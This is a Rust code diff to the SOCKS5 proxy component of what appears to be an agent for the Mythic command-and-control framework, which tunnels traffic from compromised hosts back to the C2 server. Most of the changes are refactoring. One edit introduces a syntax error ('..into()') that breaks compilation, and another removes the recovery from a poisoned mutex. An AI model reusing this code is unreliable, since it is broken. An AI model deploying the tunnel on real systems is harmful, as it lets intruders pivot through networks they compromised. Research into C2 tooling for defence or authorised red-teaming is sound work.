@@ -92,19 +92,17 @@ fn build_reply(rep: u8, bound: Option<SocketAddr>) -> Vec<u8> {
     out
 }
 
-fn send_socks_live(server_id: &str, data: &[u8], exit: bool) -> Result<(), Box<dyn std::error::Error>> {
+fn send_socks_live(server_id: &str, data: &[u8], exit: bool) -> Result<(), Box<dyn Error>> {
     let sid_json = match server_id.parse::<u64>() {
-        Ok(n) => serde_json::json!(n),
-        Err(_) => serde_json::json!(server_id),
+        Ok(n) => json!(n),
+        Err(_) => json!(server_id),
     };
-    let item = serde_json::json!({
+    let item = json!({
         "server_id": sid_json,
-        "data": base64::encode(data),
+        "data": encode(data),
         "exit": exit
     });
-
-    // Avoid dropping data if the mutex is poisoned
-    let mut out = SOCKS_OUT.lock().unwrap_or_else(|p| p.into_inner());
+    let mut out = SOCKS_OUT.lock().unwrap();
     out.push(item);
     Ok(())
 }
@@ -113,12 +111,11 @@ fn send_exit_live(server_id: &str) {
     let _ = send_socks_live(server_id, &[], true);
 }
 
-
 /* --------------------------- CONNECT frame parsing ------------------------- */
 
 fn parse_connect(decoded: &[u8]) -> Result<(String, u16, u8), Box<dyn Error>> {
     if decoded.len() < 4 { return Err("SOCKS5 request too short".into()); }
-    if decoded[0] != 0x05 { return Err("Unsupported SOCKS version".into()); }
+    if decoded[0] != 0x05 { return Err("Unsupported SOCKS version"..into()); }
     if decoded[1] != 0x01 { return Err("Not CONNECT (CMD!=0x01)".into()); }
     if decoded[2] != 0x00 { return Err("RSV must be 0x00".into()); }
 
@@ -257,7 +254,7 @@ async fn run_session(
     // Connect to destination
     let remote = match timeout(Duration::from_secs(15), TcpStream::connect((addr.as_str(), port))).await {
         Ok(Ok(s)) => s,
-        Ok(Err(e) ) => {
+        Ok(Err(e)) => {
             let rep = if e.to_string().to_lowercase().contains("refused") { 0x05 }
                       else if e.to_string().to_lowercase().contains("unreachable") { 0x03 }
                       else if e.to_string().to_lowercase().contains("unsupported") { 0x08 }
@@ -280,7 +277,7 @@ async fn run_session(
 
     let (mut r_r, mut r_w) = remote.into_split();
 
-    // A2M: Agent to Mythic (remote read -> send to mythic)
+    // A2M: Agent to mythic (remote read -> send to mythic)
     let sid_up = server_id.clone();
     let parent_up = parent_task_id.clone();
     let a2m = tokio::spawn(async move {
